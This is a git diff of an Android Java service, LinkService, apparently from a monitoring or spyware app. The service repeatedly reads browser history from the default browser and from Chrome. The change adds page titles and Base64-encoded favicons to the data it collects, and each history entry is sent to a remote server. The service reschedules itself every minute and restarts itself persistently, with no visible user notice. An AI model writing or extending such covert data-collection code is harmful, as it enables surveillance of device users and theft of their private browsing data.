@@ -4,7 +4,6 @@ import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
-import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -17,14 +16,17 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.database.Cursor;
+import android.database.SQLException;
 import android.net.Uri;
 import android.os.IBinder;
 import android.preference.PreferenceManager;
 import android.provider.Browser;
+import android.util.Base64;
 
-import com.inet.android.request.DataRequest;
+import com.inet.android.request.ConstantValue;
+import com.inet.android.request.RequestList;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WorkTimeDefiner;
+import com.inet.android.utils.ValueWork;
 
 /**
  * Browser history viewing class
@@ -35,38 +37,18 @@ import com.inet.android.utils.WorkTimeDefiner;
 public class LinkService extends Service {
 
 	private static final int SERVICE_REQUEST_CODE = 25; // service unique int
-	final String LOG_TAG = "historyService";
-	private SharedPreferences sPref;
-	final String SAVED_TIME = "saved_time";
-	private Context context;
+	private final String LOG_TAG = LinkService.class.getSimpleName().toString();
+	private final String SAVED_TIME = "saved_time";
 	private SharedPreferences sp;
 
 	public void onCreate() {
 		super.onCreate();
-		startService(new Intent(this, LinkService.class));
-
-		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
-
-		context = getApplicationContext();
-		sp = PreferenceManager.getDefaultSharedPreferences(context);
-
 	}
 
 	public int onStartCommand(Intent intent, int flags, int startId) {
 
-		Logging.doLog(LOG_TAG,
-				"onStartCommand - " + sp.getString("account", "account"),
-				"onStartCommand - " + sp.getString("account", "account"));
-
 		sp = PreferenceManager.getDefaultSharedPreferences(this);
-		String linkEnd = sp.getString("code", "2");
-
-		if (linkEnd.equals("3")) {
-			Logging.doLog(LOG_TAG, "code : 3", "code : 3");
-
-			return 0;
-		}
-
+		
 		Calendar cal = Calendar.getInstance();
 		// restart task after 1 minute
 		cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "1")));
@@ -79,20 +61,15 @@ public class LinkService extends Service {
 		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
 				servicePendingIntent);
 
-		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
-		if (!isWork) {
-			Logging.doLog(LOG_TAG,
-					"isDoWork return " + Boolean.toString(isWork),
-					"isDoWork return " + Boolean.toString(isWork));
+		if (ValueWork.getState(ConstantValue.TYPE_HISTORY_BROUSER_REQUEST, this) == 0)
+			return 0;
 
-			return Service.START_STICKY;
-		} else {
-			Logging.doLog(LOG_TAG,
-					"isDoWork return " + Boolean.toString(isWork),
-					"isDoWork return " + Boolean.toString(isWork));
-		}
-
-		linkTask(); // viewing history task
+		try {
+			linkTask();
+		} catch (JSONException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} // viewing history task
 
 		super.onStartCommand(intent, flags, startId);
 		return Service.START_STICKY;
@@ -109,20 +86,21 @@ public class LinkService extends Service {
 	}
 
 	@SuppressLint("SimpleDateFormat")
-	void linkTask() {
-		String[] proj = new String[] {Browser.BookmarkColumns.TITLE,
-				Browser.BookmarkColumns.URL, Browser.BookmarkColumns.DATE, 
-				Browser.BookmarkColumns.CREATED};
+	void linkTask() throws JSONException {
+
+		String[] proj = new String[] { Browser.BookmarkColumns._ID,
+				Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL,
+				Browser.BookmarkColumns.VISITS, Browser.BookmarkColumns.DATE,
+				Browser.BookmarkColumns.FAVICON };
+
 		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0";
-		
+
 		// default browser
 		Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI, proj,
 				sel, null, null);
 		mCur.moveToFirst();
 
-		sPref = PreferenceManager.getDefaultSharedPreferences(context);
-
-		String urlDate = "", url = "";
+		String urlDate = "", url = "", title = "";
 
 		if (mCur.moveToFirst() && mCur.getCount() > 0) {
 			boolean cont = true;
@@ -134,54 +112,68 @@ public class LinkService extends Service {
 				DateFormat formatter = new SimpleDateFormat(
 						"yyyy-MM-dd HH:mm:ss");
 
-				String savedTime = sPref.getString(SAVED_TIME, "");
+				String savedTime = sp.getString(SAVED_TIME, "");
 
 				Calendar calendar = Calendar.getInstance();
 				calendar.setTimeInMillis(Long.parseLong(savedTime));
 
 				if (Long.parseLong(urlDate) > Long.parseLong(savedTime)) {
 
-					Logging.doLog(LOG_TAG,
+					JSONObject info = new JSONObject();
+					JSONObject object = new JSONObject();
+
+					Logging.doLog(
+							LOG_TAG,
 							"saved time: "
 									+ formatter.format(calendar.getTime())
 											.toString(), "saved time: "
 									+ formatter.format(calendar.getTime())
 											.toString());
+					String encodedImage;
 
 					calendar = Calendar.getInstance();
 					calendar.setTimeInMillis(Long.parseLong(urlDate));
 
 					url = mCur.getString(mCur
 							.getColumnIndex(Browser.BookmarkColumns.URL));
+					title = mCur.getString(mCur
+							.getColumnIndex(Browser.BookmarkColumns.TITLE));
+					Logging.doLog(LOG_TAG, "url" + title, "url" + title);
+					try {
+						byte[] favicon = mCur
+								.getBlob(mCur
+										.getColumnIndex(Browser.BookmarkColumns.FAVICON));
+						if (favicon != null) {
+							encodedImage = Base64.encodeToString(favicon,
+									Base64.DEFAULT);
+							Logging.doLog(LOG_TAG, "image", "image");
+							info.put("icon", encodedImage);
+							favicon = null;
 
+						}
+					} catch (SQLException e) {
+						Logging.doLog(LOG_TAG, "favicon error", "favicon error");
+					}
 					String urlDateInFormat = formatter.format(
 							calendar.getTime()).toString();
-					
-//					String sendJSONStr = null;
-					JSONObject jsonObject = new JSONObject();
-					JSONArray data = new JSONArray();
-					JSONObject info = new JSONObject();
-					JSONObject object = new JSONObject();
+
+					// String sendJSONStr = null;
+
 					try {
 
 						info.put("url", url);
-						info.put("duration", "30");
-
+						info.put("name", title);
 						object.put("time", urlDateInFormat);
 						object.put("type", "7");
 						object.put("info", info);
-						data.put(object);
-						jsonObject.put("data", data);
 						// sendJSONStr = jsonObject.toString();
-//						sendJSONStr = data.toString();
+						// sendJSONStr = data.toString();
 					} catch (JSONException e) {
 						Logging.doLog(LOG_TAG, "json сломался", "json сломался");
 					}
+					RequestList.sendDataRequest(object.toString(), this);
 
-					DataRequest dr = new DataRequest(context);
-					dr.sendRequest(object.toString());
-
-					Editor ed = sPref.edit();
+					Editor ed = sp.edit();
 					ed.putString(SAVED_TIME, urlDate);
 					ed.commit();
 
@@ -194,86 +186,106 @@ public class LinkService extends Service {
 			}
 		}
 		mCur.close();
-		
+
 		// chrome
-		Uri uriCustom = Uri.parse("content://com.android.chrome.browser/bookmarks");
-		Cursor chromeCursor = getContentResolver().query(uriCustom, proj, sel, null, null);
-		String chromeUrlDate = "", chromeUrl = "";
-		
-//		if (chromeCursor != null) {
-//			chromeCursor.moveToFirst();
-//		}
-		
+		Uri uriCustom = Uri
+				.parse("content://com.android.chrome.browser/bookmarks");
+		Cursor chromeCursor = getContentResolver().query(uriCustom, proj, sel,
+				null, null);
+		String chromeUrlDate = "", chromeUrl = "", chromeTitle = "";
+
+		// if (chromeCursor != null) {
+		// chromeCursor.moveToFirst();
+		// }
+
 		if (chromeCursor != null)
-		if (chromeCursor.moveToFirst() && chromeCursor.getCount() > 0) {
-			boolean cont = true;
-			while (chromeCursor.isAfterLast() == false && cont) {
-				chromeUrlDate = chromeCursor.getString(chromeCursor
-						.getColumnIndex(Browser.BookmarkColumns.DATE));
-				Context context = getApplicationContext();
-
-				DateFormat formatter = new SimpleDateFormat(
-						"yyyy-MM-dd HH:mm:ss");
-
-				String savedTime = sPref.getString(SAVED_TIME, "");
-
-				Calendar calendar = Calendar.getInstance();
-				calendar.setTimeInMillis(Long.parseLong(savedTime));
-
-				if (Long.parseLong(chromeUrlDate) > Long.parseLong(savedTime)) {
-
-					Logging.doLog(LOG_TAG,
-							"--- "
-									+ formatter.format(calendar.getTime())
-											.toString(), "--- "
-									+ formatter.format(calendar.getTime())
-											.toString());
-
-					calendar = Calendar.getInstance();
-					calendar.setTimeInMillis(Long.parseLong(chromeUrlDate));
-
-					chromeUrl = chromeCursor.getString(chromeCursor
-							.getColumnIndex(Browser.BookmarkColumns.URL));
-
-					String urlDateInFormat = formatter.format(
-							calendar.getTime()).toString();
-					
-//					String sendJSONStr = null;
-					JSONObject jsonObject = new JSONObject();
-					JSONArray data = new JSONArray();
+			if (chromeCursor.moveToFirst() && chromeCursor.getCount() > 0) {
+				boolean cont = true;
+				while (chromeCursor.isAfterLast() == false && cont) {
+					String encodedImage;
+					// String sendJSONStr = null;
 					JSONObject info = new JSONObject();
 					JSONObject object = new JSONObject();
-					try {
 
-						info.put("url", chromeUrl);
-						info.put("duration", "30");
+					chromeUrlDate = chromeCursor.getString(chromeCursor
+							.getColumnIndex(Browser.BookmarkColumns.DATE));
+					Context context = getApplicationContext();
 
-						object.put("time", urlDateInFormat);
-						object.put("type", "7");
-						object.put("info", info);
-						data.put(object);
-						jsonObject.put("data", data);
-						// sendJSONStr = jsonObject.toString();
-//						sendJSONStr = data.toString();
-					} catch (JSONException e) {
-						Logging.doLog(LOG_TAG, "json сломался", "json сломался");
+					DateFormat formatter = new SimpleDateFormat(
+							"yyyy-MM-dd HH:mm:ss");
+
+					String savedTime = sp.getString(SAVED_TIME, "");
+
+					Calendar calendar = Calendar.getInstance();
+					calendar.setTimeInMillis(Long.parseLong(savedTime));
+
+					if (Long.parseLong(chromeUrlDate) > Long
+							.parseLong(savedTime)) {
+
+						Logging.doLog(LOG_TAG,
+								"--- "
+										+ formatter.format(calendar.getTime())
+												.toString(), "--- "
+										+ formatter.format(calendar.getTime())
+												.toString());
+
+						calendar = Calendar.getInstance();
+						calendar.setTimeInMillis(Long.parseLong(chromeUrlDate));
+
+						chromeUrl = chromeCursor.getString(chromeCursor
+								.getColumnIndex(Browser.BookmarkColumns.URL));
+						chromeTitle = chromeCursor.getString(chromeCursor
+								.getColumnIndex(Browser.BookmarkColumns.TITLE));
+						try {
+							byte[] favicon = chromeCursor
+									.getBlob(chromeCursor
+											.getColumnIndex(Browser.BookmarkColumns.FAVICON));
+							if (favicon != null) {
+								encodedImage = Base64.encodeToString(favicon,
+										Base64.DEFAULT);
+								info.put("icon", encodedImage);
+								favicon = null;
+
+							}
+						} catch (SQLException e) {
+							Logging.doLog(LOG_TAG, "favicon error",
+									"favicon error");
+						}
+
+						String urlDateInFormat = formatter.format(
+								calendar.getTime()).toString();
+
+						try {
+
+							info.put("url", chromeUrl);
+							info.put("name", chromeTitle);
+
+							object.put("time", urlDateInFormat);
+							object.put(
+									"type",
+									ConstantValue.TYPE_HISTORY_BROUSER_REQUEST);
+							object.put("info", info);
+						} catch (JSONException e) {
+							Logging.doLog(LOG_TAG, "json сломался",
+									"json сломался");
+						}
+
+						RequestList.sendDataRequest(object.toString(), this);
+
+						Editor ed = sp.edit();
+						ed.putString(SAVED_TIME, chromeUrlDate);
+						ed.commit();
+
+						Logging.doLog(LOG_TAG,
+								formatter.format(calendar.getTime()).toString()
+										+ " - " + chromeUrl,
+								formatter.format(calendar.getTime()).toString()
+										+ " - " + chromeUrl);
 					}
-
-					DataRequest dr = new DataRequest(context);
-					dr.sendRequest(object.toString());
-
-					Editor ed = sPref.edit();
-					ed.putString(SAVED_TIME, chromeUrlDate);
-					ed.commit();
-
-					Logging.doLog(LOG_TAG, formatter.format(calendar.getTime())
-							.toString() + " - " + chromeUrl,
-							formatter.format(calendar.getTime()).toString()
-									+ " - " + chromeUrl);
+					chromeCursor.moveToNext();
 				}
-				chromeCursor.moveToNext();
 			}
-		}
-		if (chromeCursor != null)chromeCursor.close();
+		if (chromeCursor != null)
+			chromeCursor.close();
 	}
 }
